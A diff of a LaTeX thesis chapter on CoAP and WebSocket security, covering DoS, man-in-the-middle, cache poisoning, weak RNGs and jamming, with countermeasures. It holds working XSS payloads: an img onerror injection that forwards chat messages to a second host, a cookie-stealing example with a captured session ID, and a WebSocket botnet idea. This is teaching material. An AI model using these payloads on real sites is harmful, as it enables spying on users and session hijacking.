@@ -1,29 +1,50 @@
-	\section{Vulnerabilities and possible attacks}
+	\section{Vulnerabilities and attacks}
 	In this section we will analyze the vulnerabilities of both CoAP and WebSocket, we will also show some attacks,
 	where possible we will show you the code, but in order to make the document more comfortable to read we will not
 	show the entire code but only the necessary.\newline
-	In case you are interested in reproducing the examples the code is available on GitHub at this link: \url{https://github.com/TheRealLolloFake/tesi}, for each example we will describe how to configure the environment
+	In case you are interested in reproducing the examples the code is available on GitHub at this link:\\ \url{https://github.com/TheRealLolloFake/tesi}
+	For each example we will describe how to configure the environment
 	and list down the required tools.\newline
 	
-	\subsection{Possible attacks and terminology}
-	In this short section I will list the name of the most common attacks in order to make the reading more due to the fact these terms will be recurrent from now on.\newline
+	\subsection{Terminology}
+	In this short section I will list the most common attacks in order to make the reading more comfortable considering that these terms will be recurrent from now on.\newline
 	
 	A \emph{Denial of Service} (DoS) is a particular attack that tries to make a machine or a resource unavailable, this
 	attack is carried out by sending a huge amount of requests to an endpoint.\newline
 	A more efficient variant of a DoS is the \emph{Distributed Denial of Service} (DDoS), the main goal is the same but it is achieved
 	with the collaboration of two or more clients that perform a huge amount of requests to an endpoint.\newline
+	
 	A \emph{Man in the middle} (MitM) is an attack where the attacker intrudes in a communication between two endpoint
-	and act as third party capable of receiving and forwarding messages.\newline
-	A \emph{buffer overflow} is an attack that exploit the wrong handling of the memory by a program, usually when a buffer
-	overflow happens the program crashes, that is because some content has overwrite important data in the memory,
+	and act as third party capable of receiving, modifying and forwarding messages.\newline
+	A MitM is difficult to discover because it is silent, but it is possible to detect an intruder by analyzing
+	the latency in the communication; even using SSL is not enough if the man in the middle has intercepted
+	the message at the beginning between the two endpoint.\\
+	
+	
+	A well known attack is the \emph{buffer overflow} which exploits the wrong handling of the memory by a program, usually when a buffer
+	overflow happens the program crashes, that is because some content has been overwritten important,
 	but if the content provided by an attacker is specifically crafted it could lead to the execution of arbitrary code
-	and the corruption of the system; this particular attack is quite common on low level program written in assembly, C or C++.\newline
-	With the term \emph{injection} we mean the introduction of code inside an application by an attacker.\newline
-	A \emph{Cold boot attack} is a particular attack that relies on the data remanence property of the RAM, basically when
-	a system is shutdown some data remains in memory for a little amount of time; if the attack, with the aid of liquid nitrogen or similar tools, is capable of reducing the temperature, he can extend the time window in which data remains in memory, then with the aid of special tools it will dump the content of the memory.\newline
+	and the corruption of the system; this particular attack is quite common on low level program written in assembly, C or C++
+	because the programmer must take care of the memory handling.\newline
+	
+	With the term \emph{injection} we mean the introduction of code inside an application by an attacker, an injection
+	can be classified as:
+	\begin{itemize}
+		\item SQL injection - when part of SQL syntax is added to a query.
+		\item URL injection - when malicious code is added via URL.
+		\item DOM injection - when DOM elements hide malicious content.
+		\item Code injection - when code is injected inside another application.
+	\end{itemize}
+	
+	A \emph{Cold boot attack} is a particular technique that relies on the data remanence property of the RAM, basically when
+	a system is shutdown some data remains in memory for a little amount of time; if the attacker, with the aid of liquid nitrogen or similar tools, is capable of reducing the temperature, he can extend the time window in which data remains in memory, then with the aid of special tools he will dump the memory.\newline
+	
+	\emph{Cross-site scripting} (XSS) is a vulnerability found in web applications.\\
+	XSS allows attacker to inject client-side script into web pages viewed by other users, there are two kind of XSS vulnerabilities:
+	reflected and persistent, the first are common and the malicious content is present only on the target browser; otherwise a persistent XSS vulnerability is more difficult to discover but more dangerous because the malicious content is saved on the server and spread around.\\
 	
 	
-	\subsection{CoAP vulnerabilities}
+	\subsection{CoAP vulnerabilities and attacks}
 	In an IoT environment, the data sent from a constrained device to a server are, most of the time, the measures taken by a sensor or an array of sensors; the server collects this data, which will be sooner or later processed in some way.\newline
 	In this particular scenario an attacker may have nothing interesting to steal in the communication between a device and the server, but it is important to avoid the forwarding of fake messages from the attacker.\newline
 	Another possible scenario is the opposite of the previous one, the server sends data to devices; this could be the typical scenario of a production line, where the server sends the parameters in order to customize the production, here is quite important to keep secure the parameters in order to avoid industrial espionage that could advantage competitors.\newline
@@ -69,7 +90,7 @@
 		\item The constrained device is likely to exhaust its energy quickly due to the continuous attempts of sending data and receiving the proper response from the server.
 	\end{enumerate}
 
-	In the first case, if the server stores the data received it may exhaust its memory or uses an old data that is considered fresh, suppose that we are dealing with a nuclear reactor that has a sensor for the temperature, if at 9.00 AM the temperature was correct but it increased a lot after one hour then the server will still receive the old one and will not notice the imminent risk that could lead to a disaster if a counter measure is not taken in time.\newline
+	In the first case, if the server stores the data received it may exhaust its memory or uses an old data that is considered fresh, suppose that we are dealing with a nuclear reactor that has a thermometer, if at 9.00 AM the temperature was correct but it increased a lot after one hour then the server will still receive the old one and will not notice the imminent risk that could lead to a disaster if a counter measure is not taken in time.\newline
 	
 	In the second case, if the constrained device exhausts its energy then the server may not proceed with its task due to the lack of data.\newline
 	
@@ -78,7 +99,7 @@
 	\paragraph{DoS on the server}
 	Performing a DoS on the server is a bit more easy because the attacker does not need to intercept messages but simply sends lots of messages to the server, but it could be difficult to turn it down because its computational power is higher.\newline
 	
-	We assume that a server has a computational power that is higher than a common desktop computer, so an attacker may not be capable of carrying out a successful DoS alone, it may need one or more machines and perform a distributed denial of server in order to overwhelm the server.\newline
+	We assume that a server has a computational power that is higher than a common desktop computer, so an attacker may not be capable of carrying out a successful DoS alone, it may need one or more machines to perform a distributed denial of server in order to overwhelm the server.\newline
 	
 	Figure \ref{fig:coap-vuln1} illustrates the difference between a DoS and DDoS.
 	
@@ -93,7 +114,7 @@
 	Identifying a DoS is difficult because a server may receive lots of request that are totally legal, for example: when a new service is made available to the public, it is possible to experience a DoS because the server is not capable of handling the amount of requests, this happens when the development team underestimate the number of user interested in the new service.\newline
 	Blocking incoming request from a certain IP is not a good idea because NAT (Network Address Translation) is used massively, thus different client are identified by the same IP when they reach the server, so if the IP is blocked some legitimate user may not be able to reach the server.\newline
 	While dealing with an IoT system, the architecture (simplified) of the system could be the one illustrated in figure \ref{fig:coap-vuln2}, where the CoAP server does not communicate directly with the client, in this particular case blocking IP could be a good choice, if the CoAP server is designed to communicate only with the constrained devices and the HTTP server, then there is no need to allow communication from other IP.\newline
-	Anyway, the HTTP server may be vulnerable to DoS attack, and by attacking it, it could be possible to generate a high traffic between the two servers and generate a denial of server even on the CoAP side.\newline
+	Anyway, the HTTP server may be vulnerable to DoS attack, and by attacking it, it could be possible to generate a high traffic between the two servers and create a denial of server even on the CoAP side.\newline
 	
 	\begin{figure}
 		\includegraphics[width=\linewidth]{coap-vuln-img2.png}
@@ -121,7 +142,7 @@
 	A firewall can avoid or mitigate this attack, simply by blocking unwanted network traffic, however the firewall could fall victim of this attack instead of the host if it is not capable of handling a huge amount of traffic.\newline
 	
 	\subsubsection{Proxy as man in the middle}
-	A proxy is, from the security point of view, a man in the middle between the client and the server, who could intercepts messages and manipulate them.
+	A proxy is, from the security point of view, a man in the middle between the client and the server, which could intercepts messages and manipulate them.
 	
 	\begin{figure}
 		\includegraphics[width=\linewidth]{coap-vuln-img3.png}
@@ -131,12 +152,12 @@
 	
 	Figure \ref{fig:coap-vuln3} illustrate where a corrupted proxy is placed in order carry out a man in the middle attack.\newline
 	
-	In order to act as man in the middle an attack should be capable of intercepting messages and avoid the forwarding of real messages to the server.\newline
+	In order to act as man in the middle an attacker should be capable of intercepting messages and avoid the forwarding of real messages to the server.\newline
 	If the constrained network has a legitimate proxy, the easiest way is to take control of it in some way, installing a physical proxy could not be feasible or may be easy to detect.\newline
 	If an attacker can act as a man in the middle by corrupting a proxy, then even using TLS is useless, that is because the attacker establishes two secure communications, one with the client and one with the server.\newline
 	In this way a man in the middle can simply read the communication or edit the content of a message at will.\newline
 	
-	Another important thing to highlight is that the protocol does not enforce that a proxy, that receives an encrypted message from a client, must forward the message to the server in an encrypted way.
+	Another important thing to highlight is that the protocol does not enforce the proxy which receives an encrypted message from a client, must forward the message to the server in an encrypted way.
 	Figure \ref{fig:coap-vuln4} illustrates the situation.\newline
 	
 	\begin{figure}
@@ -148,22 +169,21 @@
 	In this case the communication is secure only in one side, but the fact that it is not secure on the other side makes it completely insecure, so an attacker could simply exploit this behavior in order to leak information from the communication if the attacker is capable of intercepting messages.\newline
 	
 	\subsubsection{Cache poisoning}
-	If an attacker has taken control of a proxy, then it could manipulate its cache and caching a response forever, clients will then receive outdated messages that could lead to wrong behavior.\newline
-	Otherwise if the attack has found vulnerabilities on the client, and it is possible to trigger them with a particular response, it could cache a special response that may lead to the crash of the constrained device or to unexpected behavior.
+	If an attacker has taken control of a proxy, then it could manipulate its cache by caching a response forever, clients will then receive outdated messages that could lead to wrong behavior.\newline
+	Otherwise if the attacker has found vulnerabilities on the client, and it is possible to trigger them with a particular response, it could cache a special response that may lead to the crash of the constrained device or to unexpected behavior.
 	
 	\subsubsection{Random number generator}
 	The CoAP protocol specifies that a token should be generated with the aid of a secure pseudo-random number generator, in order to avoid trivial and predictable token.\newline
 	However, this is not possible in all situations; a secure pseudo-random number generator needs a good source of entropy, but a constrained device may lack this source.\newline
 	
-	Using an unsecure random number generation could lead to predictable token, a simple and common RNG could be implemented with a linear congruential generator which is defined as:
+	Using an insecure random number generation could lead to predictable token, a simple and common RNG could be implemented with a linear congruential generator which is defined as:
 	
-	\begin{equation}
-	x_{n+1}=(a\cdot x_n+c)mod m
-	\end{equation}
-	Where $m$ is the modulus and is $>0$, a is the multiplier and has values in $(0,m)$, $c$ is the increment and has values in $[0,m)$.
-	A linear congruential generator can be cracked easily by simply observing its output, as demonstrated here:
-	\url{https://tailcall.net/blog/cracking-randomness-lcgs/} \newline
-	If a constrained device is known to lack a good source of entropy, it must not be used for process where this entropy is needed, for example: if a key is needed, then it must be generated on another system and then added to the device during the manufacturing phase.
+	\begin{align*}
+	x_{n+1}=(a\cdot x_n+c)\mod m
+	\end{align*}
+	Where $m$ is the modulus and is $>0$, $a$ is the multiplier and has values in $(0,m)$, $c$ is the increment and has values in $[0,m)$.
+	A linear congruential generator can be cracked easily by simply observing its output, as demonstrated \cite{rng}. \newline
+	If a constrained device is known to lack a good source of entropy, it must not be used for process where this entropy is needed, for instance: if a cryptographic key is needed, then it must be generated on another system and then added to the device during the manufacturing phase.
 	
 	\subsubsection{Device and resource discovery}
 	CoAP has a device and resource discovery features, they are extremely important in M2M application where, most of the time, the human hand is needed only during the deployment of the system.\newline
@@ -181,18 +201,13 @@
 	\end{figure}
 	
 	The attacker acts as a legitimate server and performs a DoS on the legal CoAP server in order to make it unreachable to the CoAP client that tries to discover new devices.\newline
-	In this way the attacker is the only device that can be discovered by the client, if the attacker makes available a resource recognized as legitimate by the client, the attack can trick the client and act as the legal server.\newline
-	If we are in a scenario where the server sends parameter to a product line, if an attacker manages to replace the legal server with its malevolent version, then he can control the product line at will.\newline
+	In this way the attacker's device is the only one that can be discovered by the client, if the attacker makes available a resource recognized as legitimate by the client, he can trick the client and act as the legitimate server.\newline
+	If we are in a scenario where the server sends parameter to a product line, if the server is replaced by a malevolent version, then he can control the product line at will.\newline
 	
-	Dynamic device and resource discovery is useful because there is no need to manually configure available CoAP server, but if not done with the proper care it could lead to the scenario illustrated in figure \ref{fig:coap-vuln5}.
+	Dynamic device and resource discovery is useful because there is no need to manually configure the available CoAP server, but if not done with the proper care it could lead to the scenario illustrated in figure \ref{fig:coap-vuln5}.
 	In order to avoid this kind of attack, it can be useful to allow communication only with authenticated server, but of course the convenience of dynamic discovery is lost.\newline
 		
-	\subsection{CoAP attacks}
-	
-	In this section I will analyze the vulnerabilities of the Constrained Application Protocol showing example of attack when possible.\newline
-	Attacks can be categorized in two big families: physical and remote, an attack is physical when the attacker has physical access to the constrained devices;
-	on the other hand an attack is remote when the attacker has no physical access to the constrained devices.\newline
-	
+
 	\subsubsection{Physical attack}
 	While dealing with physical attack we assume the following:
 	\begin{itemize}
@@ -202,7 +217,7 @@
 	\end{itemize}
 	
 	\paragraph{Denial of Service}
-	If an attacker has physical access to constrained devices or a main CoAP server it can carry out a denial of service in a variety of way.\newline
+	If an attacker has physical access to constrained devices or a main CoAP server, then he can carry out a denial of service in a variety of way.\newline
 	
 	\subparagraph{Jamming}
 	This DoS can be carried out on wired and wireless network and it requires a jammer.\newline
@@ -212,16 +227,16 @@
 	
 	For the fact that CoAP is based on UDP, there could be high packet loss and lots of retransmission, for this reason a jamming DoS could be hard to notice.\newline
 	
-	A jammer could have different dimension based on how wide is its operative range, if the constrained network you want to take down is small you can use a small jammer that may be hidden in the environment, but remember that sooner or later the battery will exhaust and the DoS will cease; you can also use a big jammer with a very wide operative range, you may even place it in a different building and carry out the DoS without caring about battery life, but in this case you could take down other network and making your attack more noticeable.\newline
+	A jammer could have different dimension based on how wide is its operative range, if the constrained network you want to take down is small you can use a small one that may be hidden in the environment, but remember that sooner or later the battery will exhaust and the DoS will cease; you can also use a big one with a very wide operative range, you may even place it in a different building and carry out the DoS without caring about battery life, but in this case you could take down other network and making your attack more noticeable.\newline
 	
-	\textbf{Note:} in most of the countries, jammer are illegal and can be used legally only by the army or the police, but if you want you can find jammers on sale on the Internet easily, even on Amazon, but for professional tools it is better you call on to specialized retailers.\newline
+	\textbf{Note:} in most of the countries, jammers are illegal and can be used only by the army or the police, but if you want you can find jammers on sale on the Internet easily, even on Amazon, but for professional tools it is better you call on to specialized retailers.\newline
 	
 	There is no general countermeasure against jammer, in the case of wired network, shielded cables can be used but for a wireless network there is no way to avoid a jamming DoS, the only way is to find out the source and shut it down.\newline
 	
 	\subparagraph{Destroying the device}
-	Another simple DoS could be carried out simply by destroying the devices in the way you prefer.\newline
-	Of course this approach is not stealth at all because when someone notice the malfunctioning and after investigating on the environment it will find out the smashed devices, while in the case of a jammer it could be difficult to spot the source of the problem.\newline
-	Of course this technique could be applied even on the CoAP server or other machines, but as assumed a server could be in an environment where it is more likely to be spotted, so it could be risky.\newline
+	Another simple DoS could be carried out by destroying the devices in the way you prefer.\newline
+	Of course this approach is not stealth at all; when someone notices the malfunctioning and investigates on the environment, he will find out the smashed devices, while in the case of a jammer it could be difficult to spot the source of the problem.\newline
+	Of course this technique could be applied even on the CoAP server or other machines, but as assumed the server could be in an environment where the attacker more likely to be spotted, so it could be risky.\newline
 	
 	If the constrained network is wired then an attacker could simply cut the cables and carry out the DoS.\newline
 	
@@ -235,7 +250,7 @@
 	\begin{itemize}
 		\item Constrained devices send data to a CoAP server.
 		\item The CoAP server receives request from the constrained devices.
-		\item A desktop application communicate with the CoAP server in order to retrieve data.
+		\item A desktop application communicate with the system in order to retrieve data.
 	\end{itemize}
 
 	Usually a constrained device's purpose is sending data to the server and it may not be capable of receiving huge amount of data as response, so the response to a GET request could be difficult or impossible to handle.\newline
@@ -279,12 +294,17 @@
 	When we talk about remote attack we mean that the attacker has not physical access to devices, these are the most interesting case because it is possible to show real example.
 	
 	
-	\subsection{WebSocket vulnerabilities}
-	In this section I will analyze the vulnerabilities of WebSocket showing example of attack when possible.
+	\subsection{WebSocket vulnerabilities and attacks}
+	In this section I will analyze the vulnerabilities of WebSocket showing example of attack when possible, note that
+	all the examples use an unencrypted communication channel, even if it may seems trivial to use the encrypted channel
+	it is not, there are lots of applications unencrypted and these examples will show you why it is important to use
+	the encrypted channel.\\
+	Note that the attack performed due to lack of client authentication are possible even with SSL.
 	
-	\subsubsection{Lack of client authentication}
+	
+	\subsubsection{Lack of client authentication}\label{sssec:lack}
 	WebSocket does not specify any authentication mechanism; this allows the developer to use any suitable method.
-	From a point of view this is good because a developer is free to choose the method that suits well his project, on the other hand being to free could lead to flaws in the code.\newline
+	From a certain point of view this is good because a developer is free to choose the method that suits well his project, on the other hand being so free could lead to flaws in the code.\newline
 	The authentication method employed could be vulnerable or implemented in the wrong way, or even not implemented.\newline
 	The straightforward ways are the following:
 	\begin{itemize}
@@ -304,94 +324,41 @@
 	
 	\textbf{Note:} this is a toy example that allows the login with the following credential: \texttt{admin admin}, it is not supposed to be a secure login procedure, it is unsecure but it works well in order to make this example easy to reproduce.
 	
-	\begin{lstlisting}[language=php]
-	//login.php
-	<?php
-	session_start();
-	?>
-	
-	<html>
-		<head>
-			<title>Login page</title>
-		</head>
-		<body>
-			<form method="POST" action="reserved.php">
-			<?php
-			if(isset($_GET["err"]))echo "<div>Invalid username or password.</div>";
-			?>
-			<input type="text" id="usr" name="usr">
-			<input type="password" id="pwd" name="pwd">
-			<input type="submit" id="sub" value="Login">
-			</form>
-		</body>
-	</html>
-	
-	\end{lstlisting}
-	
+		This example is composed by the following files:
+	\begin{itemize}
+		\item login.php
+		\item reserved.php
+		\item Reserved.java
+		\item external.js
+	\end{itemize}
+		
 	\begin{lstlisting}[language=php]
 	//reserved.php
-	<?php
 	
-		$usr=isset($_POST["usr"])?$_POST["usr"]:null;
-		$pwd=isset($_POST["pwd"])?$_POST["pwd"]:null;
-		
-		if(($usr==null || $pwd==null) || (strcmp($usr,"admin")!=0 || strcmp($pwd,"admin")!=0)){
-		header("Location: http://localhost/login.php?err=true");
-		exit();
-	}
-	?>
+	...
 	
-	<html>
-		<head>
-			<title>Reserved page</title>
-		</head>
-		<body>
-			<b>Welcome admin</b>
-			<div id="placer"></div>
-			<script>
-				var placer=document.getElementById("placer");
-				var ws=new WebSocket("ws://localhost:8080/");
-				ws.onmessage=function(event){
-					var elem=document.createElement("b");
-					elem.textContent=event.data;
-					placer.appendChild(elem);
-				}
-			</script>
-		</body>
-	</html>
+	<script>
+		var placer=document.getElementById("placer");
+		var ws=new WebSocket("ws://localhost:8080/");
+		ws.onmessage=function(event){
+			var elem=document.createElement("b");
+			elem.textContent=event.data;
+			placer.appendChild(elem);
+		}
+	</script>
+	
+	...
+
 	\end{lstlisting}
 	
 	\begin{lstlisting}[language=Java]
 	//Reserved.java
-	import java.net.InetSocketAddress;
-	
-	import org.java_websocket.WebSocket;
-	import org.java_websocket.handshake.ClientHandshake;
-	import org.java_websocket.server.WebSocketServer;
-	
+
+	...
+
 	public class Reserved extends WebSocketServer  {
-	
-		public static void main( String[] args ){
-			String host = "localhost";
-			int port = 8080;
-			WebSocketServer server = new Reserved(new InetSocketAddress(host, port));
-			System.out.println("starting ...");
-			server.run();
-		}
 		
-		public Reserved(InetSocketAddress address) {
-			super(address);
-		}
-		
-		@Override
-		public void onClose(WebSocket arg0, int arg1, String arg2, boolean arg3) {
-		
-		}
-		
-		@Override
-		public void onError(WebSocket arg0, Exception arg1) {
-		
-		}
+		...
 		
 		@Override
 		public void onMessage(WebSocket arg0, String arg1) {
@@ -402,40 +369,37 @@
 		public void onOpen(WebSocket arg0, ClientHandshake arg1) {
 			arg0.send("this message should be read only by Admin");
 		}
-		
-		@Override
-		public void onStart() {
-		
-		}
+
 	}
 	
 	\end{lstlisting}
 	
-	The Java server's code requires the following library: \url{https://github.com/TooTallNate/Java-WebSocket}.\newline
+	The server is defined as a class that extends \texttt{WebSocketServer} and implements the following methods:
+	\begin{itemize}
+		\item \texttt{onClose(...)}
+		\item \texttt{onError(...)}
+		\item \texttt{onMessage(...)}
+		\item \texttt{onOpen(...)}
+	\end{itemize}
+	For our example the only two methods implemented are \texttt{onOpen(...)} and \texttt{onMessage(...)}.
 	
-	The login page shows a login form and when the login button is pressed it send a POST request to the reserved page in order to verify the login credential and access the reserved page, if the login credential are correct the access is granted, otherwise the user is redirected to the login page.\newline
+	The login page shows a login form and when the login button is pressed it sends a POST request to the reserved page in order to verify the login credential and access the reserved page, if the credential are correct the access is granted, otherwise the user is redirected to the login page.\newline
 	The WebSocket server sends a message when it receives a new connection and it will send a new message when it receives one from the client.\newline
-	If the user is not able to login then we may think that the reserved data sent by the WebSocket server is safe from prying eyes, but it is not true, in fact we could create our custom client and connect to the WebSocket server without problem.\newline
-	
-	The following code is written in Node.js and requires the following library: \url{https://github.com/websockets/ws}.\newline
+	If the user is not able to login then we may think that the reserved data sent by the WebSocket server is safe from prying eyes, but it is not true, in fact we can create our custom client and connect to the WebSocket server without problem.\newline
 	
 	\begin{lstlisting}
 	var WebSocketClient = require('websocket').client;
 	
 	var client = new WebSocketClient();
 	
-	client.on('connectFailed', function(error) {
-		console.log('Connect Error: ' + error.toString());
-	});
+	...
 	
 	client.on('connect', function(connection) {
-		
 		connection.on('message', function(message) {
 			if (message.type === 'utf8') {
 				console.log("Received: '" + message.utf8Data + "'");
 			}
 		});
-		
 	});
 	
 	client.connect('ws://localhost:8080/');
@@ -444,33 +408,29 @@
 	
 	Unsurprisingly the output is:
 	\texttt{Received: 'this message should be read only by Admin'}.\newline
-	This shows that an unsecure authentication method could lead to data leak, and if the WebSocket is dealing with precious data this could be a very big problem.\newline
+	This shows that an insecure authentication method could lead to data leak, and if the WebSocket is dealing with precious data this can be a very big problem.\newline
+	
+	In order to reproduce this example these are the requirements:
+	\begin{itemize}
+		\item the following Java library for server side WebSocket:\url{https://github.com/TooTallNate/Java-WebSocket}
+		\item The following Node.js library for client side WebSocket: \url{https://github.com/websockets/ws}
+		\item A web server that support PHP like Apache; for an easy install on Windows, XAMPP is surely the best option: \url{https://www.apachefriends.org/it/index.html}
+	\end{itemize}
 	
 	\subsubsection{Lack of data validation}
 	
-	The data validation task is not done by WebSocket but by the application itself, this could to flaws in the code.\newline
+	\paragraph{Example 1} The data validation task is not done by WebSocket but by the application itself, this could lead to flaws in the code.\newline
 	The validation should be done on both sides: client and server.\newline
 	The simplest attack that can be performed by exploiting this lack of validation could be a JavaScript code injection (client side).\newline
 	A simple example is the following vulnerable web chat.\newline
 	
-	\begin{lstlisting}[language=html]
-		//page.html
-		<html>
-			<head>
-				<title>Chat</title>
-			</head>
-			<body>
-				<div id="chat">
-				<div>No message for now</div><br>
-				</div>
-				<hr>
-				Write here:<input type="text" id="msg">
-				<button id="send" onclick="send()">Send!</button>
-				<script src="chat.js"></script>
-			</body>
-		</html>
-	\end{lstlisting}
-	
+	This example is composed by the following files:
+	\begin{itemize}
+		\item page.html
+		\item chat.js
+		\item ChatServer.js
+	\end{itemize}
+
 	\begin{lstlisting}
 	//chat.js
 	var chatbox=document.getElementById("chat");
@@ -485,56 +445,21 @@
 		}
 	}
 	
-	var ws=new WebSocket("ws://localhost/");
-	ws.onmessage = function (event) {
-		addMsg(event.data);
-	}
-	function send(){
-		var msg=document.getElementById("msg").value;
-		addMsg(msg);
-		ws.send(msg);
-	}
+	...
+	
 	\end{lstlisting}
 	
 	\begin{lstlisting}[language=Java]
-	Java (Server side)
-	Requires this library: https://github.com/TooTallNate/Java-WebSocket
-
 	// ChatServer.java
-	package id.id2;
 	
-	import java.net.InetSocketAddress;
-	
-	import org.java_websocket.WebSocket;
-	import org.java_websocket.handshake.ClientHandshake;
-	import org.java_websocket.server.WebSocketServer;
+	...
 	
 	public class ChatServer extends WebSocketServer  {
 	
 		private WebSocket arr[]=new WebSocket[2];
 		private int i=0;
 		
-		public static void main( String[] args ){
-			String host = "localhost";
-			int port = 80;
-			WebSocketServer server = new ChatServer(new InetSocketAddress(host, port));
-			System.out.println("starting ...");
-			server.run();
-		}
-		
-		public ChatServer(InetSocketAddress address) {
-			super(address);
-		}
-		
-		@Override
-		public void onClose(WebSocket arg0, int arg1, String arg2, boolean arg3) {
-		
-		}
-		
-		@Override
-		public void onError(WebSocket arg0, Exception arg1) {
-		
-		}
+		...
 		
 		@Override
 		public void onMessage(WebSocket arg0, String arg1) {
@@ -554,16 +479,13 @@
 			arr[i++]=arg0;
 		}
 		
-		@Override
-		public void onStart() {
-		
-		}
+		...
 	}
 	
 	\end{lstlisting}
 	
-	The HTML page simply shows the messages and a little form to write and send a message.\newline
-	The JavaScript code simply handles the interface and the WebSocket connection, when the button is clicked by the user the message is add to the chatbox and sent to the WebSocket server that will send it to the other client (if present).\newline
+	The HTML page shows the messages and a little form to write and send a message.\newline
+	The JavaScript code handles the interface and the WebSocket connection, when the button is clicked by the user, the message is added to the chatbox and sent to the WebSocket server that will forward it to the other client (if present).\newline
 	The Java code creates a WebSocket server that handles only two connections and simply acts as a proxy between the two clients.\newline
 	Neither the client neither the server perform a check of the incoming data, from the point of view of the server it is not a problem, it does nothing more than simply forward the message to the other client, but we could say that it is not guaranteeing a secure communication between the two clients.\newline
 	On the other hand the client is severely at risk, in fact if client A is chatting with client B, and client B sends the following message:\newline
@@ -573,31 +495,31 @@
 	\end{lstlisting}
 	
 	Then an alert box will compare on the other client’s browser (even on the client which send the message).
-	In this case no damage has been done to the other client, but if the code placed inside the \texttt{onerror} callback is bit more complex it could create serious harm to the client, for example we could open another WebSocket in order to spy the user, for example:
+	In this case the other client is leaved unharmed, but if the code placed inside the \texttt{onerror} callback is a bit more complex it can create serious harm to the client, for example we could open another WebSocket connection in order to spy the user, for example:
 	
 	\begin{lstlisting}[language=html]
 		<img src=1 hidden onerror="var badws=new WebSocket('ws://10.0.3.40:8080/'); function send(){var msg=document.getElementById('msg').value;addMsg(msg);ws.send(msg);badws.send(msg);} var tmp=document.getElementById('send'); tmp.onclick=send;">
 	\end{lstlisting}
 	
 	In this example we created a new WebSocket and defined again the \texttt{send(…)} function invoked by the button that sends a message, we added: \texttt{badws.send(msg)} in order to forward the message to another server.
-	We are also exploiting some JavaScript’s features, but this is not the appropriate section and we will talk about it later on.
-	The code for the malicious server is very similar to the code of the legitimate WebSocket server, it only write on the console the received messages.
+	The code for the malicious server is very similar to the code of the legitimate WebSocket server, it only writes on the console the received messages.
 	
 	In order to avoid trivial attack like the one presented, the client should always check incoming data, and if the data must be showed to the user it must be sanitized properly.\newline
 	Another possible way to avoid an attack like that is to perform a sanitization even server side, in such a way the server act as a proxy that secure the messages, of course the client must still check the incoming data, assuming that the server is not compromised is a strong assumption that should not be done.\newline
 	
-	I will now show you an example that could leak important information contained in a cookie, for example the session id, if an attacker is capable of stealing your session id he can access the website with your credentials without the need of knowing your username and password.\newline
+	In order to reproduce this example you only need the following Java library for server side WebSocket: \url{https://github.com/TooTallNate/Java-WebSocket}.
 	
-	\texttt{Note:} again the login procedure is not secure, the focus is not on it and it is as simple as possible in order to make this example easy in order to be reproduced.\newline
 	
-	//aggiungere il codice
+	\paragraph{Example 2} I will now show you an example that could leak important information contained in a cookie, for example the session id, if an attacker is capable of stealing your id, he can access the website with your credentials without the need of knowing your username and password.\newline
 	
-	The login page is the same seen before in a previous example, the reserved page is similar but it allows the access with the following credentials:
+	\texttt{Note:} again the login procedure is not secure, the focus is not on it and it is as simple as possible in order to make this example easy to reproduce.\newline
+	
+	The login page is the same seen before in example 1, the reserved page is similar but it allows the access with the following credentials:
 	\begin{itemize}
 		\item \texttt{pippo pippo}
 		\item \texttt{pluto pluto}
 	\end{itemize}
-	Then the page include the code of the previous chat example, the javascript code is the same and even the Java server code.\newline
+	The page includes the code of the previous chat example, the javascript code is the same and even the Java server code.\newline
 	
 	In order to steal the cookie we need to send the following message:
 	\begin{lstlisting}
@@ -620,7 +542,7 @@
 	\end{lstlisting}
 	
 	
-	The output of the server is the following:
+	The output of the server is something like:
 	
 	\texttt{Cookie retrived:/stealer?v=PHPSESSID=vcqqs219ns7b4naui67bmug}.\newline
 	
@@ -646,6 +568,56 @@
 	
 	Basically, these kind of vulnerabilities rely on the misunderstanding of the sub-protocol specification.
 	
+	\subsubsection{Botnet}
+	If a web application lacks control as we have seen in chapter \ref{sssec:lack} it is possible to create a botnet.\\
+	It is also possible to make it even more dangerous if the web application has a XSS vulnerabilities that
+	allows an attacker to store malevolent code, in this way every time someone access the web application
+	is corrupted and act as a bot, while in a simpler case the client is corrupted only if the attacker
+	is capable of spreading the infection.\\
 	
+	The idea is simple: open a new WebSocket connection to the host you want to target (in general for a DDoS) for
+	each host that connects on the corrupted web application, take a look at figure \ref{fig:ws-vuln0} to have
+	an overview of the attack.\\
 	
-	\subsection{WebSocket attacks}
+	Detecting a DDoS in this situation could be difficult because all the bots may seem legitimate,
+	but if the WebSocket server verifies the \texttt{Origin} header, this attack can be avoided easily,
+	this should emphasize its usefulness.\\
+	Also, take in mind that a single bot is limited to a single WebSocket connection for each host (this is a limitation imposed by the browser), thus
+	in order to carry out a powerful DDoS the attacker should corrupt a huge number of clients, thus the attacker
+	must target a website with high traffic otherwise its botnet will not have the proper power.\\
+	
+	\begin{figure}
+		\includegraphics[width=\linewidth]{ws-vuln-img0.png}
+		\caption{Example of botnet created via WebSocket.}
+		\label{fig:ws-vuln0}
+	\end{figure}
+	
+	\subsubsection{Denial of Service}
+	There are various implementation of server side WebSocket and we will see which one is vulnerable and which is not.\\
+	These are the implementations taken under examination:
+	\begin{itemize}
+		\item Node.js - \url{https://www.npmjs.com/package/websocket}
+		\item Java \url{https://github.com/TooTallNate/Java-WebSocket}
+		\item C\# \url{https://github.com/statianzo/Fleck}
+	\end{itemize}
+
+	\subsubsection{Countermeasures}
+	In order to make WebSocket more secure there are some precautions we must take into account: first of all the usage of \texttt{wss} instead of \texttt{ws}, if the
+	communication is encrypted via SSL nobody is able to read or change the communication, of course attacks are still possible due to flaws in the SSL library or misconfiguration;
+	also take in mind that the communication channel is persistent, so the overhead introduced by SSL is heavy only at the beginning and it become negligible\cite{koch2013websockets}.\\
+	Take in mind that even if you use SSL, you should always perform a check of the message in order to avoid code injection or similar attack.\\
+	
+	Even if it has some limitations, the \texttt{Origin} header is useful to avoid undesirable connection from browsers, as we have seen in the Botnet example; always take in
+	mind that if the client is not a browser it can set the content of the header to the one accepted by your server, so don't trust a request only because it has the proper
+	value in the header.\\
+	
+	When you choose to develop an application that relies on WebSocket communication, be sure to use libraries that are up to date; browsers vendor keep their products up to date
+	but on the server side this is not so easy, there may be some implementations out of date that may be vulnerable.\\
+	
+	As WebSocket does not apply with the Same-Origin-Policy like Ajax it is possible that an attack introduce a WebSocket connection in your application even if it
+	does not use WebSocket at all, this is possible if your application has XSS vulnerabilities.\\
+	In order to mitigate this problem, the Content-Security-Policy (CSP) comes to our help, the CSP allows communications only between the browser and the hosts specified in the
